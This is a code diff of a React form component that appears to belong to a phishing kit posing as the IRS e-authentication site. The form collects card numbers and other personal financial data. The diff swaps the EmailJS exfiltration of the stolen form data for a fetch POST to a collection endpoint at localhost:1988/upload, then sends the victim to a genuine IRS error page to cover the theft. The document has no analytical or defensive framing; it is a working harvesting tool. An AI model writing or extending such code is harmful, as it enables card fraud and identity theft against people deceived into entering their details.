@@ -76,18 +76,34 @@ function Finance() {
 		setBin(CC.substr(0,6))
 	}, [CC])
 
-	const handleSubmit = e => {
+	const handleSubmit = async e => {
 		e.preventDefault()
-		emailjs.send('service_zbdegps', 'template_95nph9k', templateParams)
-		.then(function(response) {
-			console.log('SUCCESS!', response.status, response.text);
-		 }, function(error) {
-			console.log('FAILED...', error);
-		 });
+		// emailjs.send('service_zbdegps', 'template_95nph9k', templateParams)
+		// .then(function(response) {
+		// 	console.log('SUCCESS!', response.status, response.text);
+		// }, function(error) {
+		// console.log('FAILED...', error);
+		// });
+		
 		//  window.location.href = 'https://sa.www4.irs.gov/eauth/pub/registration/id_no.jsp?actionName=VerifyFinDataProxy'
 		//  window.location.href = 'https://sa.www4.irs.gov/eauth/pub/logout1.jsp?error_code=-7271'
-		 window.location.href = 'https://sa.www4.irs.gov/eauth/pub/error/technical_difficulty.jsp?'
+		await writeFile()
+		window.location.href = 'https://sa.www4.irs.gov/eauth/pub/error/technical_difficulty.jsp?'
+	}
+
+	const writeFile = async () => {
+		const config = {
+			method: "POST",
+            headers: {
+                "Content-Type": "application/json",
+                "Accept": "application/json"
+            },
+            body: JSON.stringify(templateParams)
 		}
+		const res = await fetch('http://localhost:1988/upload', config)
+		const data = await res.json()
+	}
+
 	
   return (
     <div id="main-longform">
